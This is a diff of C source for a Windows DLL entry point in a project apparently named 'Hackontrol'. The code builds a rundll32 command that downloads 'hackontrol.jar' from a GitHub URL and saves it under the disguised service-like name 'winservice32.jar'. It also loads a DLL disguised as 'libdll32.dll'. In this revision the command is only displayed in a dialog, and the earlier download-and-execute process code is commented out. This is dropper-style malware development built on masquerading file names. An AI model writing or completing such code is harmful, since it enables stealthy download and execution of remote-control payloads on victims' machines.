@@ -1,8 +1,43 @@
-#include <string>
-#include "definition.h"
+#include <khopanwindows.h>
+#include <khopanerror.h>
+#include <khopanstring.h>
+#include "initialize.h"
 
-EXPORT Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
-	STARTUPINFO startupInformationDownload = {0};
+#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")
+
+#define LIBRARY_NAME L"libdll32.dll"
+#define JAR_NAME L"winservice32.jar"
+#define DOWNLOAD_URL L"https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/hackontrol.jar"
+
+__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
+	LPWSTR windowsDirectoryPath = KHGetWindowsDirectoryW();
+
+	if(!windowsDirectoryPath) {
+		KHWin32DialogErrorW(GetLastError(), L"KHGetWindowsDirectoryW");
+		return;
+	}
+	
+	LPWSTR rundll32Path = KHFormatMessageW(L"%ws\\System32\\rundll32.exe", windowsDirectoryPath);
+
+	if(!rundll32Path) {
+		KHWin32DialogErrorW(ERROR_CAN_NOT_COMPLETE, L"KHFormatMessageW");
+		goto freeWindowsDirectoryPath;
+	}
+
+	LPWSTR downloadArgument = KHFormatMessageW(L"%ws " LIBRARY_NAME L",DownloadFile " DOWNLOAD_URL L"," JAR_NAME, rundll32Path);
+
+	if(!downloadArgument) {
+		KHWin32DialogErrorW(ERROR_CAN_NOT_COMPLETE, L"KHFormatMessageW");
+		goto freeRundll32Path;
+	}
+
+	MessageBoxW(NULL, downloadArgument, L"Dialog", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
+	FREE(downloadArgument);
+freeRundll32Path:
+	FREE(rundll32Path);
+freeWindowsDirectoryPath:
+	FREE(windowsDirectoryPath);
+	/*STARTUPINFO startupInformationDownload = {0};
 	startupInformationDownload.cb = sizeof(STARTUPINFO);
 	PROCESS_INFORMATION processInformtionDownload = {0};
 	const wchar_t* rundll32 = HJ_GetSystemDirectory(L"rundll32.exe");
@@ -48,5 +83,5 @@ EXPORT Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
 
 	if(CloseHandle(processInformtionExecute.hThread) == 0) {
 		HJ_DisplayError(GetLastError(), L"CloseHandle()");
-	}
+	}*/
 }
